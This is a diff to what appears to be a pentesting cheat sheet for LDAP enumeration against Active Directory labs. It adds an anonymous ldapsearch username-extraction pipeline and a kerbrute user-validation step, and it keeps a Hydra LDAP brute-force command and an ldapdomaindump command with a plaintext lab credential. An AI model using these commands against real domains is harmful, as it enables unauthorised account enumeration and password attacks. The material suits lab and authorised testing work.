@@ -249,7 +249,12 @@
 
 8. Find usernames: ldapsearch -H ldap://10.10.10.161 -x -b "DC=<>,DC=<>" '(objectClass=user)' sAMAccountName
 
-9. Hydra: hydra -l <Username> -P <Big_Passwordlist> <IP> ldap2 -V -f
+9. Same, but with grep: ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName | awk -F: '{ print $2 }' |  awk '{ gsub(/ /,""); print }'
+
+	1. Then validate them: /opt/kerbrute userenum --dc $ip -d baby.vl users
+
+
+11. Hydra: hydra -l <Username> -P <Big_Passwordlist> <IP> ldap2 -V -f
 LDAP Login: ldapdomaindump <IP> [-r <IP>] -u '<domain\user>' -p '<pass>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
 
 10. ldapdomaindump 10.10.55.72 -u 'LAB-ENTERPRISE\nik' -p ToastyBoi! -o ldapdomaindumpdir
